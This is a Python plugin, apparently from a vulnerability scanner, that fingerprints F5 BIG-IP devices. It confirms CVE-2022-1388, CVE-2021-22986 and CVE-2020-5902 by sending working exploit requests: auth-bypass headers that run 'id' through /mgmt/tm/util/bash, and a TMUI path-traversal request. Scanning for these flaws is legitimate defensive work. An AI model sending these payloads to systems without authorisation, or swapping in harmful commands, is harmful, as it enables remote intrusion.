from app.scanner.base import BaseScanner
from app.scanner.loader import register_scanner
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("f5_bigip_rce")


@register_scanner
class F5BigIPRCEScanner(BaseScanner):
    name = "F5 BIG-IP iControl REST RCE (CVE-2022-1388)"
    description = "F5 BIG-IP iControl REST认证绕过导致远程代码执行"
    category = "f5"
    module = "f5_bigip_rce"
    risk_level = "critical"
    risk_score = 10
    cve_ids = ["CVE-2022-1388", "CVE-2021-22986", "CVE-2020-5902"]
    references = [
        "https://support.f5.com/csp/article/K23605346",
        "https://nvd.nist.gov/vuln/detail/CVE-2022-1388",
    ]
    fix_suggestion = "升级BIG-IP至修复版本，限制iControl REST接口访问IP"

    DETECT_PATHS = [
        "/tmui/login.jsp",
        "/mgmt/tm/util/bash",
        "/",
    ]

    EXPLOIT_PAYLOADS = [
        {
            "name": "CVE-2022-1388 iControl REST RCE",
            "path": "/mgmt/tm/util/bash",
            "method": "POST",
            "data": '{"command":"run","utilCmdArgs":"-c id"}',
            "headers": {
                "Content-Type": "application/json",
                "X-F5-Auth-Token": "",
                "Authorization": "Basic YWRtaW46",
                "Connection": "X-F5-Auth-Token, X-Forwarded-Host",
            },
            "marker": "uid=",
        },
        {
            "name": "CVE-2021-22986 iControl REST RCE",
            "path": "/mgmt/tm/util/bash",
            "method": "POST",
            "data": '{"command":"run","utilCmdArgs":"-c id"}',
            "headers": {
                "Content-Type": "application/json",
                "X-F5-Auth-Token": "a]",
                "Authorization": "Basic YWRtaW46",
            },
            "marker": "uid=",
        },
        {
            "name": "CVE-2020-5902 TMUI RCE",
            "path": "/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp",
            "method": "GET",
            "marker": "auth",
        },
    ]

    def _detect_f5(self) -> bool:
        for path in ["/", "/tmui/login.jsp"]:
            url = f"{self.target}{path}"
            resp = http_request("GET", url)
            if resp is None:
                continue
            if "BIG-IP" in resp.text or "F5" in resp.text or "tmui" in resp.text.lower():
                return True
            if resp.headers.get("Server", "").find("BigIP") >= 0:
                return True
            if resp.headers.get("X-F5-") or resp.headers.get("Set-Cookie", "").find("BIGipServer") >= 0:
                return True
        return False

    def check(self) -> bool:
        is_f5 = self._detect_f5()
        if not is_f5:
            return False

        self.add_result(
            name="F5 BIG-IP 检测",
            risk_level="info",
            risk_score=0,
            target_url=self.target,
            detail="检测到F5 BIG-IP设备",
            evidence="响应中包含F5/BIG-IP特征标识",
        )

        found = False
        for payload in self.EXPLOIT_PAYLOADS:
            url = f"{self.target}{payload['path']}"
            headers = payload.get("headers", {})
            data = payload.get("data")

            resp = http_request(payload["method"], url, data=data, headers=headers)
            if resp is None:
                continue

            marker = payload.get("marker", "")
            if marker and marker in resp.text and resp.status_code == 200:
                self.add_result(
                    name=payload["name"],
                    risk_level="critical",
                    risk_score=10,
                    target_url=url,
                    detail=f"确认漏洞: {payload['name']}",
                    payload=data or payload["path"],
                    response_snippet=resp.text[:500],
                    evidence=f"响应包含命令执行结果特征: {marker}",
                )
                found = True

        return found
